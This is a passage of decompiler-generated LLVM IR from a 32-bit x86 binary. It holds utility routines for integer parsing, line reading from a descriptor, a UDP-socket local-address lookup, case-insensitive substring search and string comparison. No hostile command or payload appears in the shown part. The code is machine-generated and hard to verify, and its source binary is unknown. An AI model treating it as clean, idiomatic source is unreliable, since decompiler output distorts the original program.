  %v1_80515f0 = inttoptr i32 %v0_80515f2 to i8*
  %v2_80515f0 = load i8, i8* %v1_80515f0, align 1
  %v3_80515f0 = zext i8 %v2_80515f0 to i32
  %v5_80515f0 = and i32 %v4_80515f0, -256
  %v6_80515f0 = or i32 %v3_80515f0, %v5_80515f0
  %v1_80515f2 = add i32 %v0_80515f2, 1
  %v7_80515fc = icmp eq i8 %v2_80515f0, 32
  br i1 %v7_80515fc, label %dec_label_pc_80515f0, label %dec_label_pc_8051600

dec_label_pc_8051600:                             ; preds = %dec_label_pc_80515f0
  %v10_8051600 = icmp eq i8 %v2_80515f0, 9
  br i1 %v10_8051600, label %dec_label_pc_80515f0, label %dec_label_pc_8051604

dec_label_pc_8051604:                             ; preds = %dec_label_pc_8051600
  %v10_8051604 = icmp eq i8 %v2_80515f0, 10
  br i1 %v10_8051604, label %dec_label_pc_80515f0, label %dec_label_pc_8051608

dec_label_pc_8051608:                             ; preds = %dec_label_pc_8051604
  %tmp41 = sext i32 %arg2 to i64
  %v10_8051608 = icmp eq i8 %v2_80515f0, 45
  br i1 %v10_8051608, label %dec_label_pc_80516bd, label %dec_label_pc_8051611

dec_label_pc_8051611:                             ; preds = %dec_label_pc_8051608
  %v10_8051611 = icmp eq i8 %v2_80515f0, 43
  br i1 %v10_8051611, label %dec_label_pc_80516ed, label %dec_label_pc_805161a

dec_label_pc_805161a:                             ; preds = %dec_label_pc_8051611, %dec_label_pc_80516ed
  %v0_805166430 = phi i32 [ %v1_80515f2, %dec_label_pc_8051611 ], [ %v1_80516f0, %dec_label_pc_80516ed ]
  %v0_805169016.in = phi i8 [ %v2_80515f0, %dec_label_pc_8051611 ], [ %v2_80516ed, %dec_label_pc_80516ed ]
  %v2_805166e9 = phi i8 [ %v2_80515f0, %dec_label_pc_8051611 ], [ %v2_80516ed, %dec_label_pc_80516ed ]
  br label %dec_label_pc_8051627

dec_label_pc_8051627:                             ; preds = %dec_label_pc_80516bd, %dec_label_pc_805161a
  %v0_805166429 = phi i32 [ %v1_80516c5, %dec_label_pc_80516bd ], [ %v0_805166430, %dec_label_pc_805161a ]
  %v0_805169015.in = phi i8 [ %v2_80516bd, %dec_label_pc_80516bd ], [ %v0_805169016.in, %dec_label_pc_805161a ]
  %v2_805166e8 = phi i8 [ %v2_80516bd, %dec_label_pc_80516bd ], [ %v2_805166e9, %dec_label_pc_805161a ]
  %v0_8051627 = phi i64 [ 2147483648, %dec_label_pc_80516bd ], [ 2147483647, %dec_label_pc_805161a ]
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_80516bd ], [ 0, %dec_label_pc_805161a ]
  %v12_805162b = udiv i64 %v0_8051627, %tmp41
  %v13_805162b = trunc i64 %v12_805162b to i32
  %v14_805162b = urem i64 %v0_8051627, %tmp41
  %v15_805162b = trunc i64 %v14_805162b to i32
  br label %dec_label_pc_805166e

dec_label_pc_8051640:                             ; preds = %dec_label_pc_805166e
  %v1_8051640 = add nsw i32 %v0_8051640, -48
  %v7_8051647 = icmp slt i32 %v1_8051640, %arg2
  br i1 %v7_8051647, label %dec_label_pc_8051649, label %dec_label_pc_805169a

dec_label_pc_8051649:                             ; preds = %dec_label_pc_8051640, %dec_label_pc_8051690
  %v1_8051661 = phi i32 [ %v1_8051640, %dec_label_pc_8051640 ], [ %v2_8051692, %dec_label_pc_8051690 ]
  %v2_8051649 = icmp slt i32 %v0_8051649, 0
  br i1 %v2_8051649, label %dec_label_pc_80516b8, label %dec_label_pc_805164d

dec_label_pc_805164d:                             ; preds = %dec_label_pc_8051649
  %tmp42 = icmp ugt i32 %v0_805164d, %v13_805162b
  br i1 %tmp42, label %dec_label_pc_80516b8, label %dec_label_pc_8051653

dec_label_pc_8051653:                             ; preds = %dec_label_pc_805164d
  %v15_805164d = icmp eq i32 %v0_805164d, %v13_805162b
  br i1 %v15_805164d, label %dec_label_pc_80516b2, label %dec_label_pc_8051655

dec_label_pc_8051655:                             ; preds = %dec_label_pc_80516b2, %dec_label_pc_8051653
  %v4_805165e = mul i32 %v1_805165e, %arg2
  %v2_8051661 = add i32 %v1_8051661, %v4_805165e
  br label %dec_label_pc_8051664

dec_label_pc_8051664:                             ; preds = %dec_label_pc_80516b8, %dec_label_pc_8051655
  %v1_805165e26 = phi i32 [ %v1_805165e, %dec_label_pc_80516b8 ], [ %v2_8051661, %dec_label_pc_8051655 ]
  %v0_80516a220 = phi i32 [ %v0_805164d, %dec_label_pc_80516b8 ], [ %v2_8051661, %dec_label_pc_8051655 ]
  %v0_805169a19 = phi i32 [ -1, %dec_label_pc_80516b8 ], [ 1, %dec_label_pc_8051655 ]
  %v1_8051664 = inttoptr i32 %v0_8051664 to i8*
  %v2_8051664 = load i8, i8* %v1_8051664, align 1
  %v1_805166a = add i32 %v0_8051664, 1
  br label %dec_label_pc_805166e

dec_label_pc_805166e:                             ; preds = %dec_label_pc_8051627, %dec_label_pc_8051664
  %v0_8051664 = phi i32 [ %v0_805166429, %dec_label_pc_8051627 ], [ %v1_805166a, %dec_label_pc_8051664 ]
  %v1_805165e = phi i32 [ 0, %dec_label_pc_8051627 ], [ %v1_805165e26, %dec_label_pc_8051664 ]
  %v0_805164d = phi i32 [ 0, %dec_label_pc_8051627 ], [ %v0_80516a220, %dec_label_pc_8051664 ]
  %v0_8051649 = phi i32 [ 0, %dec_label_pc_8051627 ], [ %v0_805169a19, %dec_label_pc_8051664 ]
  %v0_8051640.in = phi i8 [ %v0_805169015.in, %dec_label_pc_8051627 ], [ %v2_8051664, %dec_label_pc_8051664 ]
  %v2_805166e = phi i8 [ %v2_805166e8, %dec_label_pc_8051627 ], [ %v2_8051664, %dec_label_pc_8051664 ]
  %v0_8051640 = sext i8 %v0_8051640.in to i32
  %v1_8051671 = add i8 %v2_805166e, -48
  %tmp43 = icmp ult i8 %v1_8051671, 10
  br i1 %tmp43, label %dec_label_pc_8051640, label %dec_label_pc_8051678

dec_label_pc_8051678:                             ; preds = %dec_label_pc_805166e
  %v1_8051678 = add i8 %v2_805166e, -65
  store i32 55, i32* @ecx, align 4
  %tmp44 = icmp ult i8 %v1_8051678, 26
  br i1 %tmp44, label %dec_label_pc_8051690, label %dec_label_pc_8051684

dec_label_pc_8051684:                             ; preds = %dec_label_pc_8051678
  %v1_8051684 = add i8 %v2_805166e, -97
  %tmp45 = icmp ult i8 %v1_8051684, 26
  br i1 %tmp45, label %dec_label_pc_805168b, label %dec_label_pc_805169a

dec_label_pc_805168b:                             ; preds = %dec_label_pc_8051684
  store i32 87, i32* @ecx, align 4
  br label %dec_label_pc_8051690

dec_label_pc_8051690:                             ; preds = %dec_label_pc_8051678, %dec_label_pc_805168b
  %v1_8051692 = phi i32 [ 55, %dec_label_pc_8051678 ], [ 87, %dec_label_pc_805168b ]
  %v2_8051692 = sub nsw i32 %v0_8051640, %v1_8051692
  %v7_8051698 = icmp slt i32 %v2_8051692, %arg2
  br i1 %v7_8051698, label %dec_label_pc_8051649, label %dec_label_pc_805169a

dec_label_pc_805169a:                             ; preds = %dec_label_pc_8051640, %dec_label_pc_8051684, %dec_label_pc_8051690
  %v2_805169a = icmp slt i32 %v0_8051649, 0
  br i1 %v2_805169a, label %dec_label_pc_80516d9, label %dec_label_pc_805169e

dec_label_pc_805169e:                             ; preds = %dec_label_pc_805169a
  store i32 %stack_var_-20.0, i32* @ecx, align 4
  %v1_80516a4 = icmp eq i32 %stack_var_-20.0, 0
  br i1 %v1_80516a4, label %dec_label_pc_80516aa, label %dec_label_pc_80516a8

dec_label_pc_80516a8:                             ; preds = %dec_label_pc_805169e
  %v1_80516a8 = sub i32 0, %v0_805164d
  br label %dec_label_pc_80516aa

dec_label_pc_80516aa:                             ; preds = %dec_label_pc_805169e, %dec_label_pc_80516a8
  %v0_80516b1 = phi i32 [ %v0_805164d, %dec_label_pc_805169e ], [ %v1_80516a8, %dec_label_pc_80516a8 ]
  ret i32 %v0_80516b1

dec_label_pc_80516b2:                             ; preds = %dec_label_pc_8051653
  %v5_80516b2 = sub i32 %v1_8051661, %v15_805162b
  %v11_80516b2 = xor i32 %v1_8051661, %v15_805162b
  %v12_80516b2 = xor i32 %v5_80516b2, %v1_8051661
  %v13_80516b2 = and i32 %v12_80516b2, %v11_80516b2
  %v14_80516b2 = icmp slt i32 %v13_80516b2, 0
  %v15_80516b2 = icmp eq i32 %v5_80516b2, 0
  %v16_80516b2 = icmp slt i32 %v5_80516b2, 0
  %v3_80516b6 = icmp ne i1 %v16_80516b2, %v14_80516b2
  %v4_80516b6 = or i1 %v15_80516b2, %v3_80516b6
  br i1 %v4_80516b6, label %dec_label_pc_8051655, label %dec_label_pc_80516b8

dec_label_pc_80516b8:                             ; preds = %dec_label_pc_805164d, %dec_label_pc_80516b2, %dec_label_pc_8051649
  br label %dec_label_pc_8051664

dec_label_pc_80516bd:                             ; preds = %dec_label_pc_8051608
  %v1_80516bd = inttoptr i32 %v1_80515f2 to i8*
  %v2_80516bd = load i8, i8* %v1_80516bd, align 1
  %v1_80516c5 = add i32 %v0_80515f2, 2
  br label %dec_label_pc_8051627

dec_label_pc_80516d9:                             ; preds = %dec_label_pc_805169a
  %v8_80516d9 = icmp eq i32 %stack_var_-20.0, 0
  %v2_80516de = zext i1 %v8_80516d9 to i32
  %v1_80516e33 = or i32 %v2_80516de, -2147483648
  ret i32 %v1_80516e33

dec_label_pc_80516ed:                             ; preds = %dec_label_pc_8051611
  %v1_80516ed = inttoptr i32 %v1_80515f2 to i8*
  %v2_80516ed = load i8, i8* %v1_80516ed, align 1
  %v1_80516f0 = add i32 %v0_80515f2, 2
  br label %dec_label_pc_805161a

; uselistorder directives
  uselistorder i32 %v5_80516b2, { 1, 2, 0 }
  uselistorder i32 %v2_8051692, { 1, 0 }
  uselistorder i8 %v2_8051664, { 1, 0 }
  uselistorder i32 %v2_8051661, { 1, 0 }
  uselistorder i32 %v1_8051661, { 0, 1, 3, 2 }
  uselistorder i32 %v13_805162b, { 1, 0 }
  uselistorder i32 %v1_80515f2, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_80515f0, { 2, 1, 0 }
  uselistorder i8 %v2_80515f0, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 %v0_80515f2, { 1, 0, 2, 3 }
  uselistorder i8 9, { 0, 4, 6, 5, 1, 7, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80516b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80516aa, { 1, 0 }
  uselistorder label %dec_label_pc_805169a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051690, { 1, 0 }
  uselistorder label %dec_label_pc_805166e, { 1, 0 }
  uselistorder label %dec_label_pc_8051649, { 1, 0 }
  uselistorder label %dec_label_pc_805161a, { 1, 0 }
}

define i32 @function_8051700(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051700:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8051701 = load i32, i32* @edi, align 4
  %v0_8051703 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* @edi, align 4
  %v0_8051715.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051715

dec_label_pc_8051715:                             ; preds = %dec_label_pc_805172d.dec_label_pc_8051715_crit_edge, %dec_label_pc_8051700
  %v0_805171c = phi i32 [ %v0_805171c.pre, %dec_label_pc_805172d.dec_label_pc_8051715_crit_edge ], [ %arg3, %dec_label_pc_8051700 ]
  %v1_8051716 = phi i32 [ %v1_8051728, %dec_label_pc_805172d.dec_label_pc_8051715_crit_edge ], [ 0, %dec_label_pc_8051700 ]
  %v0_8051716 = phi i32 [ %v1_805172d, %dec_label_pc_805172d.dec_label_pc_8051715_crit_edge ], [ %arg1, %dec_label_pc_8051700 ]
  %v0_8051715 = phi i32 [ %v1_8051725, %dec_label_pc_805172d.dec_label_pc_8051715_crit_edge ], [ %v0_8051715.pre, %dec_label_pc_8051700 ]
  %v2_8051716 = add i32 %v0_8051716, %v1_8051716
  %v4_805171d = inttoptr i32 %v2_8051716 to i32*
  %v5_805171d = call i32 @function_8051c1c(i32 %v0_805171c, i32* %v4_805171d, i32 1, i32 %v0_8051715)
  %v1_8051725 = add i32 %v5_805171d, -1
  %v8_8051725 = icmp eq i32 %v1_8051725, 0
  %v1_8051726 = icmp eq i1 %v8_8051725, false
  %v0_8051734.pre = load i32, i32* @ebx, align 4
  br i1 %v1_8051726, label %dec_label_pc_8051734, label %dec_label_pc_8051728

dec_label_pc_8051728:                             ; preds = %dec_label_pc_8051715
  %v1_8051728 = add i32 %v0_8051734.pre, 1
  store i32 %v1_8051728, i32* @ebx, align 4
  %v0_8051729 = load i32, i32* %ebp.global-to-local, align 4
  %v7_805172b = icmp sgt i32 %v0_8051729, %v1_8051728
  br i1 %v7_805172b, label %dec_label_pc_805172d, label %dec_label_pc_8051734

dec_label_pc_805172d:                             ; preds = %dec_label_pc_8051728
  %v1_805172d = load i32, i32* %esi.global-to-local, align 4
  %v3_805172d = add i32 %v1_805172d, %v0_8051734.pre
  %v4_805172d = inttoptr i32 %v3_805172d to i8*
  %v5_805172d = load i8, i8* %v4_805172d, align 1
  %v14_805172d = icmp eq i8 %v5_805172d, 10
  %v1_8051732 = icmp eq i1 %v14_805172d, false
  br i1 %v1_8051732, label %dec_label_pc_805172d.dec_label_pc_8051715_crit_edge, label %dec_label_pc_8051734

dec_label_pc_805172d.dec_label_pc_8051715_crit_edge: ; preds = %dec_label_pc_805172d
  %v0_805171c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051715

dec_label_pc_8051734:                             ; preds = %dec_label_pc_8051715, %dec_label_pc_8051728, %dec_label_pc_805172d
  %v0_8051734 = phi i32 [ %v1_8051728, %dec_label_pc_8051728 ], [ %v1_8051728, %dec_label_pc_805172d ], [ %v0_8051734.pre, %dec_label_pc_8051715 ]
  %v1_8051734 = icmp eq i32 %v0_8051734, 0
  %v1_8051736 = icmp eq i1 %v1_8051734, false
  %v0_8051743 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051743 = select i1 %v1_8051736, i32 %v0_8051743, i32 0
  store i32 %v0_8051703, i32* @ebx, align 4
  store i32 %v0_8051701, i32* @edi, align 4
  ret i32 %v2_8051743

; uselistorder directives
  uselistorder i32 %v1_8051728, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8051734.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8051725, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_8051c1c, { 1, 0 }
  uselistorder label %dec_label_pc_8051734, { 2, 1, 0 }
}

define i32 @function_8051750() local_unnamed_addr {
dec_label_pc_8051750:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_805175d = call i32 @function_8051fb9(i32 16)
  %v1_8051762 = inttoptr i32 %v1_805175d to i32*
  store i32 0, i32* %v1_8051762, align 4
  %v3_805176f = call i32 @function_8052275(i32 2, i32 2, i32 0)
  store i32 %v3_805176f, i32* %esi.global-to-local, align 4
  %v10_805177b = icmp eq i32 %v3_805176f, -1
  br i1 %v10_805177b, label %dec_label_pc_80517c2, label %dec_label_pc_8051780

dec_label_pc_8051780:                             ; preds = %dec_label_pc_8051750
  %v2_8051780 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8051780, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_805179f = call i32 @function_805209a(i32 %v3_805176f, i32 %v2_8051780, i32 16)
  %v2_80517a7 = ptrtoint i32* %stack_var_-12 to i32
  %v0_80517ad = load i32, i32* %esi.global-to-local, align 4
  %v3_80517ae = call i32 @function_80520c5(i32 %v0_80517ad, i32 %v2_8051780, i32 %v2_80517a7)
  %v1_80517b6 = call i32 @function_8051a81(i32 %v0_80517ad)
  br label %dec_label_pc_80517c2

dec_label_pc_80517c2:                             ; preds = %dec_label_pc_8051750, %dec_label_pc_8051780
  %v0_80517c7 = phi i32 [ 0, %dec_label_pc_8051750 ], [ 134744072, %dec_label_pc_8051780 ]
  ret i32 %v0_80517c7

; uselistorder directives
  uselistorder i32 %v3_805176f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805209a, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8052275, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80517c2, { 1, 0 }
}

define i32 @function_80517d0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80517d0:
  %tmp18 = inttoptr i32 %arg3 to i8*
  %v2_80517e2 = load i8, i8* %tmp18, align 1
  %v3_80517e2 = icmp eq i8 %v2_80517e2, 0
  br i1 %v3_80517e2, label %dec_label_pc_80517f8, label %dec_label_pc_80517e8

dec_label_pc_80517e8:                             ; preds = %dec_label_pc_80517d0, %dec_label_pc_80517e8
  %v2_80517e8 = phi i32 [ %v1_80517eb, %dec_label_pc_80517e8 ], [ 0, %dec_label_pc_80517d0 ]
  %v1_80517eb = add i32 %v2_80517e8, 1
  %v2_80517f2 = add i32 %v1_80517eb, %arg3
  %v3_80517f2 = inttoptr i32 %v2_80517f2 to i8*
  %v4_80517f2 = load i8, i8* %v3_80517f2, align 1
  %v5_80517f2 = icmp eq i8 %v4_80517f2, 0
  %v1_80517f6 = icmp eq i1 %v5_80517f2, false
  br i1 %v1_80517f6, label %dec_label_pc_80517e8, label %dec_label_pc_80517f8

dec_label_pc_80517f8:                             ; preds = %dec_label_pc_80517e8, %dec_label_pc_80517d0
  %v2_805182f = phi i32 [ 0, %dec_label_pc_80517d0 ], [ %v1_80517eb, %dec_label_pc_80517e8 ]
  %v4_80517fe = ptrtoint i8* %arg1 to i32
  %tmp25 = icmp slt i32 %arg2, 1
  br i1 %tmp25, label %dec_label_pc_805182c, label %dec_label_pc_8051806.preheader

dec_label_pc_8051806.preheader:                   ; preds = %dec_label_pc_80517f8
  %v4_8051806.pre = load i32, i32* @ecx, align 4
  %v6_8051808.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051806

dec_label_pc_8051806:                             ; preds = %dec_label_pc_8051806.preheader, %dec_label_pc_8051827
  %v0_8051827 = phi i32 [ %arg2, %dec_label_pc_8051806.preheader ], [ %v1_8051827, %dec_label_pc_8051827 ]
  %v6_8051808 = phi i32 [ %v6_8051808.pre, %dec_label_pc_8051806.preheader ], [ %v2_8051821, %dec_label_pc_8051827 ]
  %v0_8051835 = phi i32 [ 0, %dec_label_pc_8051806.preheader ], [ %v1_80518088, %dec_label_pc_8051827 ]
  %v4_8051806 = phi i32 [ %v4_8051806.pre, %dec_label_pc_8051806.preheader ], [ %v0_8051821, %dec_label_pc_8051827 ]
  %v0_805180c = phi i32 [ %v4_80517fe, %dec_label_pc_8051806.preheader ], [ %v1_805180c, %dec_label_pc_8051827 ]
  %v1_8051806 = inttoptr i32 %v0_805180c to i8*
  %v2_8051806 = load i8, i8* %v1_8051806, align 1
  %v3_8051806 = zext i8 %v2_8051806 to i32
  %v5_8051806 = and i32 %v4_8051806, -256
  %v6_8051806 = or i32 %v3_8051806, %v5_8051806
  store i32 %v6_8051806, i32* @ecx, align 4
  %v2_8051808 = add i32 %v0_8051835, %arg3
  %v3_8051808 = inttoptr i32 %v2_8051808 to i8*
  %v4_8051808 = load i8, i8* %v3_8051808, align 1
  %v5_8051808 = zext i8 %v4_8051808 to i32
  %v7_8051808 = and i32 %v6_8051808, -256
  %v8_8051808 = or i32 %v5_8051808, %v7_8051808
  %v1_805180c = add i32 %v0_805180c, 1
  %v1_805180d = add i8 %v2_8051806, -65
  %v8_8051812 = icmp ugt i8 %v1_805180d, 25
  br i1 %v8_8051812, label %dec_label_pc_8051817, label %dec_label_pc_8051814

dec_label_pc_8051814:                             ; preds = %dec_label_pc_8051806
  %v1_8051814 = or i32 %v6_8051806, 96
  store i32 %v1_8051814, i32* @ecx, align 4
  br label %dec_label_pc_8051817

dec_label_pc_8051817:                             ; preds = %dec_label_pc_8051806, %dec_label_pc_8051814
  %v0_8051821 = phi i32 [ %v6_8051806, %dec_label_pc_8051806 ], [ %v1_8051814, %dec_label_pc_8051814 ]
  %v1_8051817 = add i8 %v4_8051808, -65
  %v8_805181c = icmp ugt i8 %v1_8051817, 25
  br i1 %v8_805181c, label %dec_label_pc_8051821, label %dec_label_pc_805181e

dec_label_pc_805181e:                             ; preds = %dec_label_pc_8051817
  %v1_805181e = or i32 %v8_8051808, 96
  br label %dec_label_pc_8051821

dec_label_pc_8051821:                             ; preds = %dec_label_pc_8051817, %dec_label_pc_805181e
  %v2_8051821 = phi i32 [ %v8_8051808, %dec_label_pc_8051817 ], [ %v1_805181e, %dec_label_pc_805181e ]
  %v1_8051821 = trunc i32 %v0_8051821 to i8
  %v3_8051821 = trunc i32 %v2_8051821 to i8
  %v15_8051821 = icmp eq i8 %v1_8051821, %v3_8051821
  br i1 %v15_8051821, label %dec_label_pc_8051835, label %dec_label_pc_8051825

dec_label_pc_8051825:                             ; preds = %dec_label_pc_8051821
  br label %dec_label_pc_8051827

dec_label_pc_8051827:                             ; preds = %dec_label_pc_8051835, %dec_label_pc_8051825
  %v1_80518088 = phi i32 [ %v1_8051835, %dec_label_pc_8051835 ], [ 0, %dec_label_pc_8051825 ]
  %v1_8051827 = add i32 %v0_8051827, -1
  %tmp26 = icmp slt i32 %v1_8051827, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_8051806, label %dec_label_pc_805182c

dec_label_pc_805182c:                             ; preds = %dec_label_pc_8051827, %dec_label_pc_80517f8
  store i32 %v2_805182f, i32* @edx, align 4
  ret i32 -1

dec_label_pc_8051835:                             ; preds = %dec_label_pc_8051821
  %v1_8051835 = add i32 %v0_8051835, 1
  %v14_8051836 = icmp eq i32 %v2_805182f, %v1_8051835
  %v1_8051839 = icmp eq i1 %v14_8051836, false
  br i1 %v1_8051839, label %dec_label_pc_8051827, label %dec_label_pc_805183b

dec_label_pc_805183b:                             ; preds = %dec_label_pc_8051835
  store i32 %v4_80517fe, i32* @ecx, align 4
  %v2_8051841 = sub i32 %v1_805180c, %v4_80517fe
  store i32 %v2_805182f, i32* @edx, align 4
  ret i32 %v2_8051841

; uselistorder directives
  uselistorder i32 %v1_8051827, { 1, 0 }
  uselistorder i32 %v0_8051835, { 1, 0 }
  uselistorder i32 %v4_80517fe, { 2, 1, 0 }
  uselistorder i32 %v2_805182f, { 2, 0, 1 }
  uselistorder i8 25, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8051821, { 1, 0 }
  uselistorder label %dec_label_pc_8051817, { 1, 0 }
  uselistorder label %dec_label_pc_8051806, { 1, 0 }
  uselistorder label %dec_label_pc_80517e8, { 1, 0 }
}

define i32 @function_8051850() local_unnamed_addr {
dec_label_pc_8051850:
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %v4_8051852 = ptrtoint i8* %tmp13 to i32
  %v4_8051858 = ptrtoint i8* %tmp to i32
  %v2_805185c = load i8, i8* %tmp13, align 1
  %v3_805185c = icmp eq i8 %v2_805185c, 0
  br i1 %v3_805185c, label %dec_label_pc_8051868, label %dec_label_pc_8051861

dec_label_pc_8051861:                             ; preds = %dec_label_pc_8051850, %dec_label_pc_8051861
  %v0_8051861 = phi i32 [ %v1_8051861, %dec_label_pc_8051861 ], [ 0, %dec_label_pc_8051850 ]
  %v1_8051861 = add i32 %v0_8051861, 1
  %v2_8051862 = add i32 %v1_8051861, %v4_8051852
  %v3_8051862 = inttoptr i32 %v2_8051862 to i8*
  %v4_8051862 = load i8, i8* %v3_8051862, align 1
  %v5_8051862 = icmp eq i8 %v4_8051862, 0
  %v1_8051866 = icmp eq i1 %v5_8051862, false
  br i1 %v1_8051866, label %dec_label_pc_8051861, label %dec_label_pc_8051868

dec_label_pc_8051868:                             ; preds = %dec_label_pc_8051861, %dec_label_pc_8051850
  %v0_8051879 = phi i32 [ 0, %dec_label_pc_8051850 ], [ %v1_8051861, %dec_label_pc_8051861 ]
  %v2_805186a = load i8, i8* %tmp, align 1
  %v3_805186a = icmp eq i8 %v2_805186a, 0
  br i1 %v3_805186a, label %dec_label_pc_8051877, label %dec_label_pc_8051870

dec_label_pc_8051870:                             ; preds = %dec_label_pc_8051868, %dec_label_pc_8051870
  %v0_8051870 = phi i32 [ %v1_8051870, %dec_label_pc_8051870 ], [ 0, %dec_label_pc_8051868 ]
  %v1_8051870 = add i32 %v0_8051870, 1
  %v2_8051871 = add i32 %v1_8051870, %v4_8051858
  %v3_8051871 = inttoptr i32 %v2_8051871 to i8*
  %v4_8051871 = load i8, i8* %v3_8051871, align 1
  %v5_8051871 = icmp eq i8 %v4_8051871, 0
  %v1_8051875 = icmp eq i1 %v5_8051871, false
  br i1 %v1_8051875, label %dec_label_pc_8051870, label %dec_label_pc_8051877

dec_label_pc_8051877:                             ; preds = %dec_label_pc_8051870, %dec_label_pc_8051868
  %v0_8051877 = phi i32 [ 0, %dec_label_pc_8051868 ], [ %v1_8051870, %dec_label_pc_8051870 ]
  store i32 %v0_8051877, i32* @edx, align 4
  %v12_8051879 = icmp eq i32 %v0_8051879, %v0_8051877
  br i1 %v12_8051879, label %dec_label_pc_8051884.preheader, label %dec_label_pc_805187d

dec_label_pc_8051884.preheader:                   ; preds = %dec_label_pc_8051877
  %v1_805188417 = add i32 %v0_8051879, -1
  store i32 %v1_805188417, i32* @edx, align 4
  %v10_805188518 = icmp eq i32 %v0_8051879, 0
  br i1 %v10_805188518, label %dec_label_pc_8051892, label %dec_label_pc_805188a

dec_label_pc_805187d:                             ; preds = %dec_label_pc_805188a, %dec_label_pc_8051877
  ret i32 0

dec_label_pc_8051882:                             ; preds = %dec_label_pc_805188a
  %v3_805188a = zext i8 %v2_805188a to i32
  %v5_805188a = and i32 %v4_805188a20, -256
  %v6_805188a = or i32 %v3_805188a, %v5_805188a
  %v1_8051882 = add i32 %v0_805188221, 1
  %v1_8051883 = add i32 %v0_805188319, 1
  %v1_8051884 = add i32 %v1_805188422, -1
  store i32 %v1_8051884, i32* @edx, align 4
  %v10_8051885 = icmp eq i32 %v1_805188422, 0
  br i1 %v10_8051885, label %dec_label_pc_8051892, label %dec_label_pc_805188a

dec_label_pc_805188a:                             ; preds = %dec_label_pc_8051884.preheader, %dec_label_pc_8051882
  %v1_805188422 = phi i32 [ %v1_8051884, %dec_label_pc_8051882 ], [ %v1_805188417, %dec_label_pc_8051884.preheader ]
  %v0_805188221 = phi i32 [ %v1_8051882, %dec_label_pc_8051882 ], [ %v4_8051852, %dec_label_pc_8051884.preheader ]
  %v4_805188a20 = phi i32 [ %v6_805188a, %dec_label_pc_8051882 ], [ %v0_8051879, %dec_label_pc_8051884.preheader ]
  %v0_805188319 = phi i32 [ %v1_8051883, %dec_label_pc_8051882 ], [ %v4_8051858, %dec_label_pc_8051884.preheader ]
  %v1_805188a = inttoptr i32 %v0_805188221 to i8*
  %v2_805188a = load i8, i8* %v1_805188a, align 1
  %v3_805188c = inttoptr i32 %v0_805188319 to i8*
  %v4_805188c = load i8, i8* %v3_805188c, align 1
  %v15_805188c = icmp eq i8 %v2_805188a, %v4_805188c
  br i1 %v15_805188c, label %dec_label_pc_8051882, label %dec_label_pc_805187d

dec_label_pc_8051892:                             ; preds = %dec_label_pc_8051882, %dec_label_pc_8051884.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_805188422, { 1, 0 }
  uselistorder i32 %v0_8051879, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_805188a, { 1, 0 }
  uselistorder label %dec_label_pc_8051870, { 1, 0 }
  uselistorder label %dec_label_pc_8051861, { 1, 0 }
}

define i32 @function_80518a0() local_unnamed_addr {
dec_label_pc_80518a0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %tmp14 = call i8* @__decompiler_undefined_function_2()
  %v4_80518a2 = ptrtoint i8* %tmp14 to i32
  %v4_80518a8 = ptrtoint i8* %tmp13 to i32
  %v2_80518b0 = load i8, i8* %tmp14, align 1
  %v3_80518b0 = icmp eq i8 %v2_80518b0, 0
  br i1 %v3_80518b0, label %dec_label_pc_80518bc, label %dec_label_pc_80518b5

dec_label_pc_80518b5:                             ; preds = %dec_label_pc_80518a0, %dec_label_pc_80518b5
  %v0_80518b5 = phi i32 [ %v1_80518b5, %dec_label_pc_80518b5 ], [ 0, %dec_label_pc_80518a0 ]
  %v1_80518b5 = add i32 %v0_80518b5, 1
  %v2_80518b6 = add i32 %v1_80518b5, %v4_80518a2
  %v3_80518b6 = inttoptr i32 %v2_80518b6 to i8*
  %v4_80518b6 = load i8, i8* %v3_80518b6, align 1
  %v5_80518b6 = icmp eq i8 %v4_80518b6, 0
  %v1_80518ba = icmp eq i1 %v5_80518b6, false
  br i1 %v1_80518ba, label %dec_label_pc_80518b5, label %dec_label_pc_80518bc

dec_label_pc_80518bc:                             ; preds = %dec_label_pc_80518b5, %dec_label_pc_80518a0
  %v1_80518ca = phi i32 [ 0, %dec_label_pc_80518a0 ], [ %v1_80518b5, %dec_label_pc_80518b5 ]
  %v2_80518be = load i8, i8* %tmp13, align 1
  %v3_80518be = icmp eq i8 %v2_80518be, 0
